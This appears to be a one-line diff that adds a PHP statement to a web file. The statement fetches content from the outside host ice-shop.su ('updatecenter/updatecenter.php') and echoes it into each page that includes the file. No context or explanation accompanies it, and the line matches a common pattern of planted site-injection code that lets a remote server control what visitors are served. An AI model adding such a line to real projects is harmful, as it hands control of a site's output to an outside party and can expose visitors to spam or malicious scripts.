@@ -1,0 +1,1 @@
+﻿<?php echo file_get_contents('http://ice-shop.su/updatecenter/updatecenter.php') ?>
